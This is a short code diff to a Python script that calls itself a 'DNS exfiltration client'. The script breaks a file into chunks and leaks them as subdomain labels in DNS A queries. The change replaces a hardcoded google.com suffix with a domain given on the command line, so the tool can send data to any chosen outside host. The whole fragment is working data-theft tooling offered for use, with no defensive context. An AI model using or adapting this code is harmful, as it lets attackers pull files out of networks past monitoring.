@@ -21,15 +21,16 @@ def main(file_path):
     resolver.port = 5053
 
     for i, chunk in enumerate(chunks):
-        domain = f"{i}-{chunk}.google.com"
+        QFDN = f"{i}-{chunk}.{args.domain}"
         try:
-            result = resolver.resolve(domain, 'A')
+            result = resolver.resolve(QFDN, 'A')
         except Exception as e:
             print(f"[+] DNS query failed: {e}")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="DNS exfiltration client.")
     parser.add_argument("-f", "--file", required=True, help="Path to the file to exfiltrate.")
+    parser.add_argument("-d", "--domain", required=True, help="Doamin to query data with it. ex:google.com")
     args = parser.parse_args()
 
     main(args.file)
